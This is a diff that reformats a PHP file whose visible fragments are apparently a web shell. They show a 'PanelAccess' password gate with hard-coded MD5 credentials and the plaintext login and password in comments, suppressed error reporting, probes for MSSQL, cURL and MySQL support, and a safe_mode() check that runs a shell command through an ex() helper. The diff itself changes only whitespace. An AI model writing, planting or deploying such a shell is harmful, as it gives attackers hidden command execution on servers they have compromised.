@@ -1,12 +1,14 @@
 <?php
 $auth = 0;
-
 ini_set('session.gc_maxlifetime', 1);
 session_start();
 error_reporting(0);
+
 safe_mode();
+
 $name = '9b534ea55d0b82c3a7e80003a84b6865';     //login = 'mylogin'
 $pass = 'a029d0df84eb5549c641e04a9ef389e5';     //pass  = 'mypass'
+
 if (1 == $auth) {
     if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER']) != $name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW']) != $pass) {
         header('WWW-Authenticate: Basic realm="PanelAccess"');
@@ -430,6 +432,7 @@ function testmssql()
         return '<font size=2 color=red>OFF</font>';
     }
 }
+
 function testcurl()
 {
     if (function_exists('curl_version')) {
@@ -438,6 +441,7 @@ function testcurl()
         return '<font size=2 color=red>OFF</font>';
     }
 }
+
 function testmysql()
 {
     if (function_exists('mysql_connect')) {
@@ -446,6 +450,7 @@ function testmysql()
         return '<font size=2 color=red>OFF</font>';
     }
 }
+
 function safe_mode()
 {
     if (!$safe_mode && 3 != strpos(ex('echo abch0ld'), 'h0ld')) {
@@ -654,15 +659,6 @@ function safe_ex($in)
     }
 }
 ?>
-
-
-
-
-
-
-
-
-
 
 <html>
 <head>
